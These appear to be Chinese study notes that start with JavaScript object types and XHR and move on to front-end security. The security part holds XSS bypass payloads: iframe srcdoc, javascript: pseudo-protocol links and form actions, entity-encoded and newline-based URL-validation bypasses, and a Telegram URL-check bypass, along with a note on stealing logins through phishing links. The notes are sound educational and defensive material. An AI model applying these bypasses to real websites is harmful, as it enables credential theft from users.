<h4 id="1-普通对象（Plain-Object）"><a href="#1-普通对象（Plain-Object）" class="headerlink" title="1. 普通对象（Plain Object）"></a>1. <strong>普通对象（Plain Object）</strong></h4><p>这是最常见的对象类型。它是由 <code>&#123;&#125;</code> 字面量或 <code>new Object()</code> 创建的对象。它的属性通常是无序的键值对，值可以是任何 JavaScript 类型。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">let obj</span> = &#123;<br>  name: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  age: 25<br>&#125;;<br></code></pre></td></tr></table></figure>

<h4 id="2-数组（Array）"><a href="#2-数组（Array）" class="headerlink" title="2. 数组（Array）"></a>2. <strong>数组（Array）</strong></h4><p>虽然数组看起来像一个有序的集合，但它本质上是一个对象，数组元素是通过索引访问的，而数组本身继承自 <code>Array.prototype</code>，它也有自己的属性和方法。数组也是对象，因此它们拥有 <code>toString</code> 等从 <code>Object.prototype</code> 继承来的方法。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><br><span class="hljs-attribute">let arr</span> = [1, 2, 3, 4];<br></code></pre></td></tr></table></figure>

<h4 id="3-函数（Function）"><a href="#3-函数（Function）" class="headerlink" title="3. 函数（Function）"></a>3. <strong>函数（Function）</strong></h4><p>函数在 JavaScript 中也是一种对象。它不仅包含可执行的代码，还可以拥有属性和方法。例如，函数是通过 <code>Function</code> 构造器创建的，它是一个特殊的对象，可以调用，并且具有自己的 <code>prototype</code>。</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Hello!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="4-日期（Date）"><a href="#4-日期（Date）" class="headerlink" title="4. 日期（Date）"></a>4. <strong>日期（Date）</strong></h4><p><code>Date</code> 是 JavaScript 提供的一个内置对象，用来处理日期和时间。<code>Date</code> 是一个特殊的对象，包含了一些日期相关的方法。</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel"><br><span class="hljs-built_in">let</span> <span class="hljs-built_in">today</span> = new <span class="hljs-built_in">Date</span>();<br></code></pre></td></tr></table></figure>

<h4 id="5-正则表达式（RegExp）"><a href="#5-正则表达式（RegExp）" class="headerlink" title="5. 正则表达式（RegExp）"></a>5. <strong>正则表达式（RegExp）</strong></h4><p><code>RegExp</code> 是用于处理正则表达式的对象。它也继承自 <code>Object.prototype</code>，并具有自己的方法。</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><br>let regex <span class="hljs-operator">=</span> /abc/<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<h4 id="6-内置对象（Built-in-Objects）"><a href="#6-内置对象（Built-in-Objects）" class="headerlink" title="6. 内置对象（Built-in Objects）"></a>6. <strong>内置对象（Built-in Objects）</strong></h4><p>JavaScript 提供了很多内置对象，如：</p>
<ul>
<li><code>Math</code>：数学相关的对象</li>
<li><code>JSON</code>：用于解析和生成 JSON 格式的对象</li>
<li><code>Error</code>：用于创建和处理错误的对象</li>
<li><code>Promise</code>：处理异步操作的对象</li>
</ul>
<p>例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> mathResult = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">let</span> jsonStr = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="7-DOM-对象"><a href="#7-DOM-对象" class="headerlink" title="7. DOM 对象"></a>7. <strong>DOM 对象</strong></h4><p>在浏览器环境中，JavaScript 提供了与 HTML 文档交互的 API，其中很多对象代表了网页上的元素或节点。比如 <code>document</code> 是一个 DOM 对象，代表整个 HTML 文档。</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">div</span> = document.createElement(&#x27;<span class="hljs-keyword">div</span>&#x27;);<br></code></pre></td></tr></table></figure>

<h4 id="8-Error-对象"><a href="#8-Error-对象" class="headerlink" title="8. Error 对象"></a>8. <strong>Error 对象</strong></h4><p>当出现错误时，JavaScript 会抛出 <code>Error</code> 对象。这个对象用于捕获并描述错误信息。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">message</span>); <span class="hljs-comment">// 输出 &#x27;Something went wrong&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>注意</strong> 字符串在js里面不算对象  </p>
<p><strong>link标签</strong>  </p>
<p>用于定义文档与外部资源之间的关系。它通常用于链接CSS样式表，但也可以用于链接其他类型的资源，比如预加载的图片、网站图标（favicon）等  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;http://www.example.com&quot;</span>&gt;访问网站&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;#section2&quot;</span>&gt;跳转到第二部分&lt;/a&gt;<br>&lt;link <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;styles.css&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<p><strong>from标签</strong>  </p>
<p>用于创建交互式表单的容器标签，表单允许用户通过输入字段和控件（如文本框、复选框、单选按钮、按钮等）提交数据到服务器进行处理  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;提交地址&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;请求方法&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;编码类型&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;目标窗口或框架&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 表单元素 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="xhr"><a href="#xhr" class="headerlink" title="xhr"></a>xhr</h3><p>XHR指的是XMLHttpRequest对象，它是一种JavaScript对象，用于在后台与服务器交换数据。这是实现Ajax（Asynchronous JavaScript and XML）技术的重要部分。  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;example.php&quot;</span>, <span class="hljs-literal">true</span>);<br>xhr.onreadystatechange = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.readyState == <span class="hljs-number">4</span> &amp;&amp; xhr.status == <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(xhr.responseText);<br>  &#125;<br>&#125;;<br>xhr.send();<br><br></code></pre></td></tr></table></figure>

<p>创建了一个XHR对象，然后使用GET方法向服务器请求<code>example.php</code>文件。当服务器响应并被接收到后，将执行回调函数，并可以在控制台打印出响应的内容  </p>
<h1 id="前端安全"><a href="#前端安全" class="headerlink" title="前端安全"></a>前端安全</h1><p>js代码审计  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/richard1230/article/details/123654867">https://blog.csdn.net/richard1230/article/details/123654867</a>  </p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">查找的其他常见关键字：url:, POST, api, GET, setRequestHeader, send(（注意:只有一个 (，因为它在发出 Ajax 请求时使用！).headers,onreadystatechange, <span class="hljs-keyword">var</span> &#123;xyz&#125; = , getParameter(), parameter, .theirdomain.com, apiKey; 除此之外,还有:postMessage, messageListenger, .innerHTML, <span class="hljs-built_in">document</span>.write(, <span class="hljs-built_in">document</span>.cookie, location.href, redirectUrl, <span class="hljs-built_in">window</span>.hash;<br></code></pre></td></tr></table></figure>

<p>某个特殊页面的存储型xss去利用特殊协议去获取本地敏感文件并且截图然后发送到攻击者服务器 文章  </p>
<p><a target="_blank" rel="noopener" href="https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser/">https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser/</a>  </p>
<p>js逆向  </p>
<p><a target="_blank" rel="noopener" href="https://www.reveone.cn/article/99827d5d-4d4f-4a52-ae43-92e543ce46b3">https://www.reveone.cn/article/99827d5d-4d4f-4a52-ae43-92e543ce46b3</a>  </p>
<h2 id="浏览器安全模型"><a href="#浏览器安全模型" class="headerlink" title="浏览器安全模型"></a>浏览器安全模型</h2><p>禁止主动访问本地文件  </p>
<p>禁止调用系统api  </p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">常规应用程序可以使用系统提供的 API 执行许多操作，例如更改系统设置或网络设置。但是，<span class="hljs-keyword">JavaScript </span>无法执行这些操作。  <br>或者更准确地说，并不是 <span class="hljs-keyword">JavaScript </span>本身做不到。它只是一种编程语言。这是因为“浏览器没有向 Web 前端提供相应的 API，因此无法完成”。  <br>当我们在网页的前端执行 <span class="hljs-keyword">JavaScript </span>时，我们只能使用浏览器提供给我们的内容。例如，我们可以使用 fetch（） 发送请求或使用 setTimeout 来设置计时器。这些是浏览器提供的接口，允许我们执行某些操作。<br></code></pre></td></tr></table></figure>

<p>禁止访问其他网页的内容  </p>
<p> 每个网页仅具有自己的权限。它可以修改自己的 HTML 并执行所需的 JavaScript 代码，但它不应该访问来自其他网页的数据。这称为同源策略 （SOP）。</p>
<p>此外，这些 “数据” 不仅限于 “页面上的内容”，还包括无法访问 “其他页面的 URL”。</p>
<p>以上的所有内容都是因为  </p>
<p><strong>如果浏览器不给你它，你根本就无法得到它</strong>  </p>
<p><strong>这是 Web 前端开发与其他执行环境之间的关键区别。相反，如果您设法获取了浏览器未提供的内容，则意味着您在浏览器中发现了漏洞，可以报告它以获得奖励。</strong>  </p>
<p><strong>一个绕过</strong>  </p>
<p>如果注入点是 <code>innerHTML = &#39;(用户输入的内容)&#39; </code> 该如何绕过  </p>
<p>这样意味着  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">innerHTML = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27; <br></code></pre></td></tr></table></figure>

<p>将不起作用  </p>
<p>因为<code>innerHTML</code> 会将 <code>&lt;script&gt;</code> 标签的内容作为 <strong>纯文本</strong> 处理，而不会解析并执行其中的脚本。 </p>
<p><strong>这里其实要分两种情况</strong></p>
<p><strong>静态 HTML 页面中的情况</strong>： 如果这段代码位于静态 HTML 文件中，浏览器会正确地解析并执行 <code>&lt;script&gt;</code> 标签中的 JavaScript 代码。页面上会弹出 <code>alert(&quot;XSS&quot;)</code>。</p>
<p>例如，以下 HTML 文件会导致弹出警告框：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;output&quot;</span> style=<span class="hljs-string">&quot;margin-top: 20px; border: 1px solid #000; padding: 10px;&quot;</span>&gt;<br>  &lt;<span class="hljs-keyword">script</span>&gt;alert(<span class="hljs-string">&quot;XSS&quot;</span>)&lt;/<span class="hljs-keyword">script</span>&gt;<br>&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure>

<p>浏览器会解析 <code>&lt;script&gt;</code> 标签并执行其中的代码。</p>
<p><strong>动态插入 HTML 时（通过 <code>innerHTML</code> 或 <code>textContent</code>）</strong>：</p>
<ul>
<li>如果你将这段代码作为字符串插入到页面的 DOM 中（例如通过 <code>innerHTML</code>），浏览器的行为有所不同。</li>
<li><strong><code>innerHTML</code></strong> 会将 HTML 标签（如 <code>&lt;script&gt;</code>）作为元素渲染，但 <strong>如果该 <code>&lt;script&gt;</code> 标签已经在页面中存在或是在被动态创建时</strong>，浏览器有可能 <strong>不执行</strong> 其中的 JavaScript 代码，而仅仅作为普通文本显示。</li>
<li>这主要是浏览器的安全防护机制，防止 <strong>重复执行</strong> 或 <strong>恶意执行</strong> 动态插入的脚本。浏览器通常不会执行 <strong>已经存在的 <code>&lt;script&gt;</code> 标签</strong>，即使该标签是在 <code>innerHTML</code> 操作中动态插入的。</li>
</ul>
<p>例如，考虑下面的 JavaScript 代码：</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;output&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: 20px; border: 1px solid #000; padding: 10px;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;output&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&#x27;</span></span></span><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;XSS&quot;</span>)</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="language-xml">&#x27;;</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>在这种情况下，<strong><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code> 会作为文本插入</strong>，而不是被解析并执行。也就是说，<strong>浏览器不会执行动态插入的 <code>&lt;script&gt;</code> 标签</strong>。 </p>
<p>为了防止 XSS 攻击，浏览器通常会 <strong>禁止动态插入的 <code>&lt;script&gt;</code> 标签的执行</strong>。即使你通过 <code>innerHTML</code> 或其他方式将 <code>&lt;script&gt;</code> 标签插入 DOM，浏览器会将其中的内容当作普通文本处理，而不会去执行其中的 JavaScript。  </p>
<p>不过可以使用其他的标签 例如iframe或者是svg img等等  </p>
<p>例如使用 iframe里面的srcdoc属性  </p>
<p>因为 这里面 可以包含完整的 HTML，从而创建一个全新的网页。因此，之前<code>&lt;script&gt;</code>无用的标签可以在这里使用。此外，<strong>由于它是一个属性，因此可以预先对内容进行编码，这意味着结果是相同的</strong>  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">document.body.innerHTML =<br>  &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;lt;</span>script&gt;alert(1)<span class="hljs-symbol">&amp;lt;</span>/script&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>&#x27;;<br></code></pre></td></tr></table></figure>

<h4 id="innerText或textContent"><a href="#innerText或textContent" class="headerlink" title="innerText或textContent"></a>innerText<code>或</code>textContent</h4><p>用于替换innerhtml来处理用户输入用于防止xss攻击  </p>
<p>它们只处理文本内容，而不解析 HTML 标签或 JavaScript 代码  </p>
<p>当使用 <code>innerText</code> 或 <code>textContent</code> 设置元素内容时，任何传入的 HTML 标签都会被视为普通文本，并不会被浏览器解析为 HTML 元素。这意味着即使攻击者尝试注入 <code>&lt;script&gt;</code> 标签或任何其他 HTML 元素，这些标签也会被当作普通文本显示，而不会被当作 HTML 来执行。</p>
<h3 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h3><p>可以用来执行js的代码</p>
<p>可以用在a标签的href里面，iframe标签的src里面，甚至form标签的action和button的formaction也是可以的  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span>LLLL<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">f2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">form</span>=<span class="hljs-string">f2</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">javascript:alert(2)</span>&gt;</span>submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;</span></span></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$data</span>) <span class="hljs-meta">?&gt;</span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>`</span><br></code></pre></td></tr></table></figure>

<p>​	再来看这个  </p>
<p>“以前一直以为经过htmlspecialchars之后就不存在xss漏洞了，现在想来还是我太肤浅了”  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412081726791.png" srcset="/img/loading.gif" lazyload alt="1733649989935"></p>
<h3 id="重定向代码产生的问题"><a href="#重定向代码产生的问题" class="headerlink" title="重定向代码产生的问题"></a>重定向代码产生的问题</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">const searchParams = <span class="hljs-built_in">new</span> URLSearchParams(<span class="hljs-keyword">location</span>.<span class="hljs-keyword">search</span>);<br><span class="hljs-keyword">window</span>.<span class="hljs-keyword">location</span> = searchParams.<span class="hljs-keyword">get</span>(&quot;redirect&quot;);<br></code></pre></td></tr></table></figure>

<p>问题是 <code>window.location</code> 的值也可以是JavaScript伪协议  </p>
<p>例如 </p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">window.location</span> = <span class="hljs-string">&quot;javascript:alert(document.domain)&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>实际情况中  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/login.html?redirect=https:/</span>/example2.com<br></code></pre></td></tr></table></figure>

<p>这个url访问之后是一个登录的页面  </p>
<p>当<strong>登录成功之后</strong> 会重定向(<strong>会调用js代码来实现重定向</strong> 例如  <code>window.location.href = decodeURIComponent(target);</code> )到参数中的另外一个页面 </p>
<p>如果把redirect的内容改成JavaScript伪协议 当登录成功后 就会执行伪协议里面的内容  </p>
<p>一旦触发了这个 XSS，它的影响就很大，因为它发生在登录页面上。因此，在该页面上执行的 XSS 可以直接捕获输入值，这意味着窃取了用户的用户名和密码。为了进行实际攻击，可以向网站用户发送网络钓鱼电子邮件，包括此恶意链接供他们点击。由于 URL 看起来很正常，并且生成的页面也是真实的网站页面，因此可信度应该相当高。  </p>
<p><strong>如何防御</strong>  </p>
<p>由于payload是javascript开头 那么过滤掉这个字符串就好了  </p>
<p>但是这段代码的作用是将 <code>target</code> 变量中的 URL（经过 <code>decodeURIComponent()</code> 解码后）赋值给浏览器的 <code>window.location.href</code> 属性  </p>
<p>而属性的值是可以被编码的  </p>
<p>也就是说 我可以这么写  </p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">redirect</span>=&amp;<span class="hljs-comment">#106avascript&amp;colon;alert(1)</span><br></code></pre></td></tr></table></figure>

<p>一样可以进行重定向</p>
<p>更好的方法应该是只允许以http或者https开头的字符串  </p>
<p>还有一种方法:  </p>
<p>许多 URL 校验逻辑依赖于 <code>hostname</code> 或 <code>host</code> 属性来确定一个 URL 是否有效。例如，当你解析一个 URL 时，如果 <code>hostname</code> 或 <code>host</code> 是空的（<code>&quot;&quot;</code>），通常表示这个 URL 无效。  </p>
<p><code>new URL(&quot;javascript:alert(1)&quot;)</code> 会输出  </p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<br>  <span class="hljs-params">hostname:</span> <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-params">host:</span> <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-params">origin:</span> <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>为了绕过 可以利用 URL 解析的特性，在伪协议中插入一些特殊字符 例如  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;javascript://huli.tw/%0aalert(1)&quot;</span>));<br></code></pre></td></tr></table></figure>

<p> 利用<code>//</code>和换行符<code>%0a</code> 构造出一个看上去像是一个url的伪协议字符串 用来绕过检查 并且直接xss  </p>
<p>虽然它看起来像一个 URL，但它在 Chrome 中运行良好，没有任何问题或误报。然而，Safari 的行为有所不同。在 Safari 16.3 中执行相同的代码时，输出为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;javascript://huli.tw/%0aalert(1)&quot;</span>));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  &#123;</span><br><span class="hljs-comment">    // ...</span><br><span class="hljs-comment">    hostname: &quot;huli.tw&quot;,</span><br><span class="hljs-comment">    host: &quot;huli.tw&quot;,</span><br><span class="hljs-comment">    origin: &quot;null&quot;</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<p>在 Safari 中，它成功解析了主机名和主机。</p>
<h3 id="tg上面的一个xss"><a href="#tg上面的一个xss" class="headerlink" title="tg上面的一个xss"></a>tg上面的一个xss</h3><p>一个23年6月telegram的漏洞  </p>
<p>有一个ensureProtocol函数，负责确认url有没有:&#x2F;&#x2F;，没有的话就加上  </p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ensureProtocol</span>(<span class="hljs-params">url?: string</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">url</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">url</span>.includes(<span class="hljs-string">&quot;://&quot;</span>) ? <span class="hljs-attribute">url</span> : <span class="hljs-string">`http://<span class="hljs-subst">$&#123;url&#125;</span>`</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>除此之外 还会检查url是否有效  </p>
<p>通过使用类似<code> javascript:alert(&#39;://&#39;)</code> 之类的东西，很容易绕过此检查 但是还要检查是否有效  </p>
<p>URL 可以在开头包含用户名和密码（用于 HTTP 身份验证），以冒号 ( <code>:</code>) 分隔  </p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//username:password@www.example.com/</span><br></code></pre></td></tr></table></figure>

<p>所以说构造成这样  </p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">javascript:</span>alert@github.com/<span class="hljs-meta">#:<span class="hljs-comment">//</span></span><br></code></pre></td></tr></table></figure>

<p>在这种情况下，<code>javascript</code>是用户名，<code>alert</code>是密码，主机名是<code>github.com</code>。尽管它不以<code>http://</code>或开头<code>https://</code>，但服务器仍将其视为有效的 URL。  </p>
<p>最后通过url编码 成功绕过  </p>
<h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h4><p>PHP 中的一个内置函数，用于将字符串中的特殊字符转义为 HTML 实体（即编码）  </p>
